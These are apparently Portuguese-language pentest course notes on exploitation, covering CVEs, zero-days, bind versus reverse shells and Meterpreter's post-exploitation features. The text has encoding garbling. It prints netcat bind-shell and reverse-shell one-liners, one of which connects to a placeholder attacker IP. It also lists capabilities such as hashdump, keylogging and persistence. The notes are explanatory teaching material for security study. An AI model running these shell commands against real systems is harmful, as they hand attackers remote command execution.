# Explotation

Explora as vunerabilidade encontradas, enviando um playload para a m√°quina alvo.
- Priorizamos a explora√ß√£o pela criticidade das vunerabilidades
- Um playload pode ser um programa ou uma shell
  - A shell conecta a m√°quina alvo permite executar comandos na m√°quiona alvo

Algumas vezes n√£o s√£o encontradas vunerabilidades que possam ser exploradas. Cintudo, isso n√£o indica que n√£o possam ocorres ataques exitosos. Nesses casos, o playload √© carregado atrav√©s de engenharia social.


**Sobre vunerabilidades:**
- CVE (Common Vulnerabilities and Exposures)
  - refer√™ncia universal para que fabricantes, pesquisadores e empresas falem a mesma ‚Äúl√≠ngua‚Äù quando tratam de vulnerabilidades.
  - Formato: CVE-ANO-N√öMERO
    - Exemplo: CVE-2017-0144 (EternalBlue, usado no ataque WannaCry).
- Zero-day vulnerability: falha de seguran√ßa desconhecida pelo fabricante ou pela comunidade de seguran√ßa.
  - N√£o documentada publicamente ‚Äì n√£o existe CVE ou alerta oficial ainda.
  - N√£o tem corre√ß√£o ‚Äì os fabricantes e usu√°rios n√£o podem se proteger com patch.
  - Alvo preferido de cibercriminosos e governos ‚Äì porque √© extremamente dif√≠cil de detectar e defender.
  - Alto valor de mercado ‚Äì exploits 0-day podem ser vendidos em mercados clandestinos (ou at√© mesmo para ag√™ncias governamentais).
  - Zero-day exploit: √© o c√≥digo ou t√©cnica que explora essa falha antes que exista um patch/corre√ß√£o dispon√≠vel.
- A vunerabilidade nem sempre √© t√©cnica, pode ser tamb√©m pessoas que utilizem uma rede.
  - A maioria dos ataques s√£o de explora√ß√£o de vunerabilidades de pessoas.

A principal ferramenta utilizada durante o explotation √© o **metasploit framework**.

## Reverse Shell e Bind Shell

### **Bind Shell**

* O atacante faz com que a m√°quina-alvo **abra uma porta e ‚Äúescute‚Äù conex√µes externas**.
* O atacante ent√£o se conecta diretamente a essa porta para obter acesso.
* **Fluxo:**
  * V√≠tima ‚Üí abre porta (servidor)
  * Atacante ‚Üí conecta na porta (cliente)
* Exemplo:
```
# Na v√≠tima
nc -lvp 4444 -e /bin/bash   # abre uma shell e espera conex√£o

# No atacante
nc <IP_da_v√≠tima> 4444
```

### **Reverse Shell**

* Ao inv√©s de escutar, a v√≠tima **abre uma conex√£o de sa√≠da** para o atacante.
* Muito usado em ambientes protegidos por firewall, onde a m√°quina n√£o aceita conex√µes externas, mas **pode sair para fora (outbound)**.
* **Fluxo:**
  * Atacante ‚Üí escuta em uma porta
  * V√≠tima ‚Üí conecta no atacante e envia a shell
* Exemplo:
```
# No atacante
nc -lvp 4444   # escuta esperando a shell

# Na v√≠tima
nc <IP_do_atacante> 4444 -e /bin/bash
```

### Compara√ß√£o

| Caracter√≠stica      | Bind Shell üñ•Ô∏è‚û°Ô∏è    | Reverse Shell ‚¨ÖÔ∏èüñ•Ô∏è                |
| ------------------- | ------------------- | ---------------------------------- |
| Quem abre a porta?  | V√≠tima (servidor)   | Atacante (servidor)                |
| Quem conecta?       | Atacante            | V√≠tima                             |
| Mais f√°cil em‚Ä¶      | Rede sem firewall   | Rede com firewall (sa√≠da liberada) |
| Risco para atacante | IP e porta expostos | Atacante fica oculto (escutando)   |

## Meterpreter

O **Meterpreter** √© um **payload avan√ßado** do Metasploit Framework.
* Fornece ao atacante uma **shell interativa**, carregada inteiramente **na mem√≥ria** (sem gravar nada em disco, o que ajuda a evitar antiv√≠rus).
* Diferente de um shell simples, o Meterpreter tem **diversos comandos extras** para p√≥s-explora√ß√£o.
üëâ Em resumo: o Meterpreter √© **o ‚Äúcanivete su√≠√ßo‚Äù do pentester dentro da m√°quina comprometida**.

**Caracter√≠sticas principais:**

1. **Carregado em mem√≥ria** ‚Üí n√£o deixa rastros no disco.
2. **Modular** ‚Üí voc√™ pode carregar/extender fun√ß√µes conforme necess√°rio.
3. **Comunica√ß√£o criptografada** ‚Üí dificulta detec√ß√£o.
4. **Invisibilidade** ‚Üí roda como parte de um processo existente da v√≠tima.

**O que d√° para fazer com Meterpreter:**

* **Controle remoto da m√°quina**:
  * Executar comandos do sistema.
  * Explorar o sistema de arquivos (upload/download).
* **Coleta de informa√ß√µes**:
  * Hashdump (pegar senhas).
  * Informa√ß√µes de rede e processos.
* **Monitoramento**:
  * Keylogger.
  * Captura de tela (*screenshot*).
  * Webcam snap (foto pela c√¢mera).
* **Movimenta√ß√£o lateral**:
  * Pivoting (usar a m√°quina comprometida como ponte para atacar outras).
* **Persist√™ncia**:
  * Criar backdoors para manter acesso.
